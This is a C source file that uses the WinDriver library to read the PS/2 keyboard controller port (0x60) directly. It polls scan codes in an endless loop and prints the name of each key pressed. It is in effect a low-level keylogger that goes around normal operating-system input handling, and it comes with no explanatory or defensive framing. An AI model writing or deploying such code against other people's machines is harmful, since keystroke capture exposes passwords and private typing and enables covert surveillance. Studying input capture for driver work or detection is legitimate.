#include <stdio.h>
#include "./include/windrvr.h"
#include "./include/status_strings.h"
#include <windows.h>

#pragma comment(lib, "./lib/windrvr6.lib")

#define MY_IO_BASE 0x60
#define MY_IO_SIZE 0x10

char keycode[120][5] = {
	"","ESC","1","2","3","4","5","6","7","8",
		"9","0","-","=","BSP","TAB","Q","W","E",
		"R","T","Y","U","I","O","P","[","]","ENT",
		"LCT","A","S","D","F","G","H","J","K","L",
		";","'","`","LSH","\\","Z","X","C","V","B",
		"N","M",",",".","/","RSH","*","LAL","SPA",
		"CAP","F1","F2","F3","F4","F5","F6","F7",
		"F8","F9","F10","NUM","SCO","7","8","9","-",
		"4","5","6","+","1","2","3","0","." 
};

HANDLE hWD;

WD_CARD_REGISTER cardReg;

BYTE IO_inp(DWORD dwIOAddr)
{
	WD_TRANSFER trans;
	BZERO(trans);
	trans.cmdTrans = RP_BYTE;
	trans.dwPort = dwIOAddr;
	WD_Transfer( hWD, &trans);
	return trans.Data.Byte;
}

WORD IO_inpw(DWORD dwIOAddr)
{
	WD_TRANSFER trans;
	BZERO(trans);
	trans.cmdTrans = RP_WORD;
	trans.dwPort = dwIOAddr;
	WD_Transfer( hWD, &trans);
	return trans.Data.Word;
}

DWORD IO_inpd(DWORD dwIOAddr)
{
	WD_TRANSFER trans;
	BZERO(trans);
	trans.cmdTrans = RP_DWORD;
	trans.dwPort = dwIOAddr;
	WD_Transfer( hWD, &trans);
	return trans.Data.Dword;
}

void IO_outp(DWORD dwIOAddr, BYTE bData)
{
	WD_TRANSFER trans;
	BZERO(trans);
	trans.cmdTrans = WP_BYTE;
	trans.dwPort = dwIOAddr;
	trans.Data.Byte = bData;
	WD_Transfer(hWD, &trans);
}

void IO_outpw(DWORD dwIOAddr, WORD bData)
{
	WD_TRANSFER trans;
	BZERO(trans);
	trans.cmdTrans = WP_WORD;
	trans.dwPort = dwIOAddr;
	trans.Data.Word = bData;
	WD_Transfer(hWD, &trans);
}

void IO_outpd(DWORD dwIOAddr, DWORD bData)
{
	WD_TRANSFER trans;
	BZERO(trans);
	trans.cmdTrans = WP_DWORD;
	trans.dwPort = dwIOAddr;
	trans.Data.Dword = bData;
	WD_Transfer(hWD, &trans);
}

BOOL IO_init()
{
	WD_VERSION verBuf;
	DWORD dwStatus;
	//WD_LICENSE lic;
	hWD = INVALID_HANDLE_VALUE;
	hWD = WD_Open();

	if (hWD == INVALID_HANDLE_VALUE)
	{
		printf("error open WINDRVR!\n");
		return FALSE;
	}

	BZERO(verBuf);
	WD_Version(hWD, &verBuf);
	printf(WD_PROD_NAME" version - %s\n", verBuf.cVer);

	if (verBuf.dwVer < WD_VER)
	{
		printf("error version is not correct!\n");
		WD_Close(hWD);
		return FALSE;
	}

	BZERO(cardReg);
	cardReg.Card.dwItems = 1;
	cardReg.Card.Item[0].item = ITEM_IO;
	cardReg.Card.Item[0].fNotSharable = TRUE;
	cardReg.Card.Item[0].I.IO.dwAddr = MY_IO_BASE;
	cardReg.Card.Item[0].I.IO.dwBytes = MY_IO_SIZE;
	cardReg.fCheckLockOnly = FALSE;
	dwStatus = WD_CardRegister(hWD, &cardReg);
	if (cardReg.hCard == 0)
	{
		printf("register card error!\n");
		return FALSE;
	}

	return TRUE;
}

void IO_end()
{
	WD_CardUnregister(hWD, &cardReg);
	WD_Close(hWD);
}

void Log()
{
	BYTE retData;
	BYTE keyDown;
	BYTE keyUp;
	while (1)
	{
		retData = IO_inp((DWORD)0x00000060);
		if (retData==0x00||retData==0xff||retData==0xaa
			||retData==0xee||retData==0xf0||retData==0xfa
			||retData==0xfe||retData==0xfc)
		{
			Sleep(50);
			continue;
		}

		if (!(retData&0x80))
		{
			keyDown = retData;
		}
		if (retData&0x80)
		{
			keyUp = retData&0x7f;
			if (keyUp == keyDown)
			{
				printf("%s ", keycode[keyDown]);
				keyUp = 0;
				keyDown = 1;
			}
		}
		Sleep(50);
	}
}

int main()
{
	if (!IO_init()) return -1;
	Log();
	IO_end();
	return 0;
}
